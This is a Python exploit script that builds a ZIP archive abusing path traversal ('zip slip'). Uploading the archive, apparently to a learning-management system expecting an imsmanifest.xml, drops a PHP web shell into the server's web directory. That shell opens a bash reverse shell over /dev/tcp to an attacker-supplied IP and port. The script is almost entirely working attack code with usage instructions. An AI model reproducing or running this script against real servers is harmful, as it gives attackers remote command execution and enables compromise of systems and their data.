#!/usr/bin/python3
import os
import sys
from io import BytesIO
import zipfile

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def build_zip(attacker_ip,attacker_port,www_dir,shell_page,zip_filename):
    # Build the ZIP with custom strings for PHP shell and create on local filesystem
    print("[*] Building the ZIP file...")
    f = BytesIO()
    with zipfile.ZipFile(f, mode='w',compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../../../../../.." + www_dir + shell_page, "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/" + attacker_ip + "/" + attacker_port + " 0>&1'\"); ?>")
        zf.writestr('imsmanifest.xml', 'invalid xml!')
    # return f.getvalue()
    with open(zip_filename, 'wb') as fn:
        fn.write(f.getvalue())
    return True

# Main
def main(argv):
    if len(sys.argv) == 6:
        host = sys.argv[1]
        port = sys.argv[2]
        www_dir = sys.argv[3]
        shell_page = sys.argv[4]
        zip_filename = sys.argv[5]
    else:
        print("[*] Usage: " + sys.argv[0] + " <host> <port> <www_dir> <shell_page> <zip_filename>")
        print("[*] Example: " + sys.argv[0] + " 192.168.252.12 7777 /var/www/html /mods/hodor/revshell.php5 poc_shell.zip\n")
        exit(0)

    # Do stuff
    try:
        if build_zip(host,str(port),www_dir,shell_page,zip_filename):
            print("[+] ZIP file " + zip_filename + " created. Manually upload file and check web directory " + shell_page + ".\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
